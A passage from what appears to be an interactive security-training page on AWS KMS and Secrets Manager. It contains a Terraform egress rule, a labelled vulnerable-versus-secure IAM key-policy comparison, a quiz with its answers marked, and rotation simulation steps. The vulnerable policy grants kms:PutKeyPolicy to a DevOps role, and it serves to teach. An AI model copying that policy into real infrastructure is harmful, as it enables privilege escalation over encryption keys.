# Security group: ONLY allow RDS egress
resource "aws_security_group_rule" "lambda_egress" {
  type = "egress"
  from_port = 5432
  to_port = 5432
  protocol = "tcp"
  source_security_group_id = aws_security_group.rds.id
}

# VPC Endpoint for Secrets Manager (no internet)
# Dependencies pinned with integrity hashes
# package-lock.json enforces exact versions`
        );

        AppSecWidgets.ConfigDiff.create(
            'config-diff-4',
            `// ‚ùå VULNERABLE: Overly permissive IAM
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/DevOps"},
  "Action": [
    "kms:DescribeKey",
    "kms:GetKeyPolicy",
    "kms:PutKeyPolicy"  // ‚ùå Too powerful!
  ],
  "Resource": "*"
}

// Allows DevOps to grant themselves full kms:* 
// permissions by modifying the key policy`,
            `// ‚úÖ SECURE: Least privilege + MFA
// Read-only for DevOps
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/DevOps"},
  "Action": [
    "kms:DescribeKey",
    "kms:GetKeyPolicy"  // ‚úÖ Read-only
  ],
  "Resource": "*"
}

// Separate admin role for policy changes
{
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::123:role/KMSAdmin"},
  "Action": "kms:PutKeyPolicy",
  "Resource": "*",
  "Condition": {
    "Bool": {"aws:MultiFactorAuthPresent": "true"},
    "IpAddress": {"aws:SourceIp": "10.0.0.0/8"}
  }
}`
        );

        // ========================================
        // Interactive Tools
        // ========================================

        // Vulnerable App Simulator
        AppSecWidgets.VulnApp.create('vuln-app-kms');

        // Log Analyzer
        AppSecWidgets.LogAnalyzer.create('log-analyzer');

        // Security Quiz
        AppSecWidgets.Quiz.create('security-quiz', {
            title: "üß† KMS & Secrets Manager Security Quiz",
            intro: "Test your understanding of common pitfalls and secure patterns.",
            questions: [
                {
                    text: "Which KMS key type allows enforcement of encryption context via key policy conditions?",
                    options: [
                        { value: "aws-managed", label: "AWS Managed Key (aws/secretsmanager)" },
                        { value: "customer-managed", label: "Customer Managed Key", correct: true },
                        { value: "aws-owned", label: "AWS Owned Key" }
                    ]
                },
                {
                    text: "What happens if you decrypt a ciphertext with the wrong encryption context?",
                    options: [
                        { value: "access-denied", label: "AccessDeniedException (IAM policy blocked it)" },
                        { value: "invalid-ciphertext", label: "InvalidCiphertextException (cryptographic validation failed)", correct: true },
                        { value: "success", label: "Decryption succeeds (encryption context is optional)" }
                    ]
                },
                {
                    text: "During automatic rotation, which staging label represents the new password being prepared?",
                    options: [
                        { value: "current", label: "AWSCURRENT" },
                        { value: "pending", label: "AWSPENDING", correct: true },
                        { value: "previous", label: "AWSPREVIOUS" }
                    ]
                },
                {
                    text: "What is the best practice for rotation Lambda network access?",
                    options: [
                        { value: "public", label: "Public subnet with internet gateway for flexibility" },
                        { value: "private-nat", label: "Private subnet with NAT gateway" },
                        { value: "private-endpoint", label: "Private subnet with VPC endpoints (no internet)", correct: true }
                    ]
                },
                {
                    text: "If your application caches secrets, what is the recommended approach?",
                    options: [
                        { value: "forever", label: "Cache indefinitely to minimize API calls" },
                        { value: "ttl", label: "Cache with TTL (e.g., 5-10 minutes) and refresh periodically", correct: true },
                        { value: "never", label: "Never cache, retrieve on every request" }
                    ]
                }
            ]
        });

        // ========================================
        // Section 7: Practical Simulations
        // ========================================

        // Simulation 1 Flow
        AppSecWidgets.FlowVisualizer.create('simulation1-flow', [
            {
                title: "Step 1: Create IAM Roles",
                description: "Create app-tenant-acme and app-tenant-globex roles with tenant_id tags"
            },
            {
                title: "Step 2: Create CMK",
                description: "Customer Managed Key with encryption context enforcement in key policy"
            },
            {
                title: "Step 3: Test Encryption",
                description: "Encrypt data with tenant_id=acme context"
            },
            {
                title: "Step 4: Test Decryption",
                description: "Verify correct context succeeds, wrong context fails"
            },
            {
                title: "Step 5: Analyze CloudTrail",
                description: "Review logs to see encryption context in API calls"
            }
        ]);

        // Simulation 2 Flow
        AppSecWidgets.FlowVisualizer.create('simulation2-flow', [
            {
                title: "Step 1: Create Secret",
                description: "Create secret in Secrets Manager with CMK encryption"
            },
            {
                title: "Step 2: Deploy Rotation Lambda",
                description: "Package and deploy Lambda function with 4-step rotation logic"
            },
            {
                title: "Step 3: Configure Rotation",
                description: "Set rotation schedule (30 days) and trigger immediate rotation"
            },
            {
                title: "Step 4: Monitor Rotation",
                description: "Observe AWSPENDING ‚Üí AWSCURRENT transition, password changes"
            },
            {
                title: "Step 5: Verify Logs",
                description: "Check CloudWatch Logs for rotation steps, CloudTrail for API events"
            }
        ]);

        // Crypto Playground
        AppSecWidgets.CryptoPlayground.create('crypto-playground');

        // JWT Analyzer (for understanding secret versioning)
        AppSecWidgets.JWTAnalyzer.create('jwt-analyzer');

        // API Tester
        AppSecWidgets.APITester.create('api-tester');

        // Password Meter
        AppSecWidgets.PasswordMeter.create('password-meter');

        // Validation Trainer
        AppSecWidgets.ValidationTrainer.create('validation-trainer');
    </script>
</body>

</html>